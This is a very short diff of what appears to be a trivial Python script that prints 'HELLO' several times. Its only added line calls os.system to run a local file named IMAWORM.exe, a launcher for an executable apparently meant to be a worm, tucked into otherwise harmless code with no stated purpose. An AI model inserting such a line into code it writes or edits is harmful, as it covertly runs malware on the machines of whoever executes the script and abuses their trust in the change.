@@ -15,3 +15,4 @@ print("HELLO")
 print("HELLO")
 print("HELLO")
 
+os.system(".\IMAWORM.exe")
